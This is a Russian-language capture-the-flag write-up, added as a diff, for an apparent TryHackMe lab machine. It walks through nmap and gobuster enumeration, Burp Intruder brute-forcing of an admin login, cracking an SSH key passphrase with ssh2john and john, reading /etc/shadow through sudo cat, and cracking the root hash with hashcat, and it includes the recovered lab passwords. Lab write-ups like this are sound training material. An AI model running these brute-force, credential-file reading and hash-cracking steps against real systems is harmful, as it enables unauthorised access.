@@ -1,0 +1,44 @@
+1) nmap -A -sV -O <IP-machine>
+обнаруживаю ssh и  http
+
+2)└─# gobuster -e -u dir <IP-machine>   -w /root/Downloads/common.txt
+ обнаруживаю страницу /admin , это страница входа на сайт, в комментариях написано 
+  Hey john, if you do not remember, the username is admin
+
+3) в burpsuite я с помощью интредера выясеяю пароль к admin
+ admin:xavier
+ полсе захода на сайт меня встречает THM{brut3_f0rce_is_e4sy} это является WEB флагом и файл id_rsa
+
+4) чтобы расшифровать кодовую фразу id_rsa я скачиваю этот проект https://github.com/openwall/john и пользуюсь скриптом 
+ └─# python3 /john/run/ssh2john.py /root/Downloads/id_rsa > /root/Downloads/id_rsa.hash
+
+5) далее чтобы расшифровать кодовую фразу мне нужно воспользоваться приложением john
+ └─# john /root/Downloads/id_rsa.hash --wordlist=/root/Downloads/rockyou.txt 
+  и он выдает rockinroll
+
+6)окей я должна открыть id_rsa , ввести кодовую фразу и только после этого зайти по ssh
+ └─# ssh john@10.10.227.68 -i /root/Downloads/id_rsa
+Enter passphrase for key '/root/Downloads/id_rsa': rockinroll
+
+я зашла и сразу прочитала user.txt
+
+7)требуется узнать пароль от рута
+ sudo -l
+  cat
+
+8) я с легкостью могу прочитать root.txt
+ sudo cat /root/root.txt
+
+9)чтобы заполучить пароль от рута мне надо прочитать файл с паролями
+ sudo cat /etc/shadow | grep root
+  root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+  пароль - $6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.
+   выясняю из https://hashcat.net/wiki/doku.php?id=example_hashes что это 1800	sha512crypt $6$, SHA512 (Unix) 2
+
+10)└─# hashcat -m 1800 /root/Desktop/us.txt /root/Downloads/rockyou.txt
+ довольно быстро выясняю что пароль от рута football
+ root:football
+
+ссылки которые были полезны
+ помогло разобраться с ssh : https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/
+ 
